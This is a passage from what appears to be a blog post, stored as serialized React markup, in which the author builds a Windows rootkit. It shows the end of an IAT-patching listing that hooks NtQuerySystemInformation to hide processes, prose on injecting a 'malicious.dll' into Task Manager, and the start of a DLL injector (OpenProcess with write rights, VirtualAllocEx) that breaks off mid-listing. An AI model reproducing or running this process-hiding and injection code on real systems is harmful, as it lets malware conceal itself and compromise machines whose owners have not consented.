52%)\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement452\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"firstThunk\"]}],[\"$\",\"span\",\"code-segement453\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement454\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"u1\"]}],[\"$\",\"span\",\"code-segement455\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement456\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"Function\"]}],[\"$\",\"span\",\"code-segement457\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement458\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" patch\"]}],[\"$\",\"span\",\"code-segement459\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement460\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--46\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[46]}],[\"$\",\"span\",\"code-segement462\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                                    \"]}],[\"$\",\"span\",\"code-segement463\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"sizeof\"]}],[\"$\",\"span\",\"code-segement464\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement465\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"patch\"]}],[\"$\",\"span\",\"code-segement466\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement467\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement468\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement469\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"NULL\"]}],[\"$\",\"span\",\"code-segement470\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement471\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement472\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--47\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[47]}],[\"$\",\"span\",\"code-segement474\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"          \"]}],[\"$\",\"span\",\"code-segement475\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"break\"]}],[\"$\",\"span\",\"code-segement476\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement477\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--48\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[48]}],[\"$\",\"span\",\"code-segement479\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement480\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement481\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--49\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[49]}],[\"$\",\"span\",\"code-segement483\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        originalFirstThunk\"]}],[\"$\",\"span\",\"code-segement484\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"++\"]}],[\"$\",\"span\",\"code-segement485\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement486\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--50\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[50]}],[\"$\",\"span\",\"code-segement488\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        firstThunk\"]}],[\"$\",\"span\",\"code-segement489\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"++\"]}],[\"$\",\"span\",\"code-segement490\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement491\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--51\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[51]}],[\"$\",\"span\",\"code-segement493\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"      \"]}],[\"$\",\"span\",\"code-segement494\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement495\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--52\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[52]}],[\"$\",\"span\",\"code-segement497\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"      \"]}],[\"$\",\"span\",\"code-segement498\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"break\"]}],[\"$\",\"span\",\"code-segement499\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement500\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--53\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[53]}],[\"$\",\"span\",\"code-segement502\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement503\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement504\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--54\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[54]}],[\"$\",\"span\",\"code-segement506\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement507\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[\"// not same with getting process name (i realize that it was an array, not\"]}],[\"$\",\"span\",\"code-segement508\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--55\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[55]}],[\"$\",\"span\",\"code-segement510\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement511\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[\"// offset)\"]}],[\"$\",\"span\",\"code-segement512\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--56\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[56]}],[\"$\",\"span\",\"code-segement514\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    imageImportDescriptor\"]}],[\"$\",\"span\",\"code-segement515\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"++\"]}],[\"$\",\"span\",\"code-segement516\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement517\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--57\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[57]}],[\"$\",\"span\",\"code-segement519\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  \"]}],[\"$\",\"span\",\"code-segement520\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement521\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--58\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[58]}],[\"$\",\"span\",\"code-segement523\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement524\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"}\"]}]]]}]}],[\"$\",\"div\",null,{\"className\":\"text-center text-md text-gray-500 mt-2 mb-2\",\"children\":\"Listing 3. IAT Patching\"}]],[\"$\",\"p\",null,{\"children\":[\"On line 1, listing 2, I modified it to use the original NTQSI. Below is the statement of the modification.  \",[\"$\",\"code\",null,{\"className\":\"code-snippet\",\"children\":\" NTSTATUS status= ((PNTQSI)OriginalNtQuerySystemInformationAddress)(SystemInformationClass, systemInformation, SystemInformationLength, ReturnLength);\"}],\" Injecting Code To Remote Process For the final step,  I just need to inject my code to a remote process! Again, no idea how to do it. After a quick google search, DLL Injection seems to be the easiest, so I decided to know more about it. In simple terms, I just need to find a way for that remote process (Task Manager, in this case) to execute  \",[\"$\",\"code\",null,{\"className\":\"code-snippet\",\"children\":\"LoadLibrary(\\\\'C:/path/malicious.dll\\\\')\"}],\" or something like that.  There are only 3 steps to DLL inject. First, get process handle with write permissions. Second, store the DLL path as string in the targeted process using that process handle. Third, make the targeted process execute LoadLibrary with the stored string as the argument. Below is an excerpt of a DLL Injector code.\"]}],[[\"$\",\"pre\",null,{\"style\":{\"color\":\"white\",\"background\":\"hsl(0, 0%, 8%)\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"textShadow\":\"0 -.1em .2em black\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"borderRadius\":\".5em\",\"border\":\".3em solid hsl(0, 0%, 33%)\",\"boxShadow\":\"1px 1px .5em black inset\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"padding\":\"1em\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-cpp\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"white\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"textShadow\":\"0 -.1em .2em black\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\tHWND window \"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"token function\",\"style\":{},\"children\":[\"FindWindow\"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"NULL\"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" L\"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\\\"Task Manager\\\"\"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\r\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\tDWORD pid\"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\r\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\t\"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"token function\",\"style\":{},\"children\":[\"GetWindowThreadProcessId\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"window\"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"pid\"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\r\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\tstd\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"token double-colon\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cout \"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\u003c\u003c\"]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\\\"PID of Task Manager: \\\"\"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\u003c\u003c\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" pid \"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\u003c\u003c\"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" std\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"token double-colon\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"endl\"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\r\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[5]}],\"\\r\\n\",[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[6]}],\"\\r\\n\",[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\tLPCWSTR dllName \"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" L\"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\\\"Z:\\\\\\\\Repos\\\\\\\\Omen\\\\\\\\x64\\\\\\\\Debug\\\\\\\\OmenDll.dll\\\"\"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\r\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\tsize_t namelen \"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"token function\",\"style\":{},\"children\":[\"wcslen\"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"dllName\"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement67\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(14, 58%, 55%)\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\r\\n\"]}],[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[9]}],\"\\r\\n\",[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[10]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\tHANDLE taskManagerH \"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement75\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"token function\",\"style\":{},\"children\":[\"OpenProcess\"]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"PROCESS_VM_OPERATION \"]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"|\"]}],[\"$\",\"span\",\"code-segement80\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" PROCESS_VM_READ \"]}],[\"$\",\"span\",\"code-segement81\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"|\"]}],[\"$\",\"span\",\"code-segement82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" PROCESS_VM_WRITE\"]}],[\"$\",\"span\",\"code-segement83\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement85\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(14, 58%, 55%)\"},\"children\":[\"false\"]}],[\"$\",\"span\",\"code-segement86\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement87\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" pid\"]}],[\"$\",\"span\",\"code-segement88\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement89\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\r\\n\"]}],[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[11]}],[\"$\",\"span\",\"code-segement92\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\tLPVOID remoteString \"]}],[\"$\",\"span\",\"code-segement93\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement94\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement95\",{\"className\":\"token function\",\"style\":{},\"children\":[\"VirtualAllocEx\"]}],[\"$\",\"span\",\"code-segement96\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement97\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"taskManagerH\"]}],[\"$\",\"span\",\"code-segement98\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement100\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"NULL\"]}],[\"$\",\"span\",\"code-segement101\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement102\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"namelen\"]}],[\"$\",\"span\",\"code-segement103\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement104\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" MEM_COMMIT\"]}],[\"$\",\"span\",\"code-segement105\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement106\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" 